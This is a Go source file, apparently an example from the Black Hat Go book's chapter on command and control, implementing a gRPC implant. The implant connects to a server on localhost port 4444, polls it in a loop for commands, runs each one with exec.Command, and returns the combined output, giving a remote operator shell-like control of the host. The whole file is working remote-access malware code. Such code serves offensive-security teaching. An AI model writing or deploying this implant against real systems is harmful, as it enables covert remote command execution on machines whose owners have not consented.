package main

import (
	"google.golang.org/grpc"
	"bitbucket.org/stacktitan/blackhat-go/ch-14/grpcapi"
	"log"
	"fmt"
	"context"
	"os/exec"
	"strings"
	"time"
)

func main() {
	var
	(
		opts   []grpc.DialOption
		conn   *grpc.ClientConn
		err    error
		client grpcapi.ImplantClient
	)

	opts = append(opts, grpc.WithInsecure())
	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil {
		log.Fatal(err)
	}
	defer conn.Close()
	client = grpcapi.NewImplantClient(conn)

	ctx := context.Background()
	for {
		var req = new(grpcapi.Empty)
		cmd, err := client.FetchCommand(ctx, req)
		if err != nil {
			log.Fatal(err)
		}
		if cmd.In == "" {
			// No work
			time.Sleep(3 * time.Second)
			continue
		}

		tokens := strings.Split(cmd.In, " ")
		var c *exec.Cmd
		if len(tokens) == 1 {
			c = exec.Command(tokens[0])
		} else {
			c = exec.Command(tokens[0], tokens[1:]...)
		}
		buf, err := c.CombinedOutput()
		if err != nil {
			cmd.Out = err.Error()
		}
		cmd.Out += string(buf)
		client.SendOutput(ctx, cmd)
	}
}
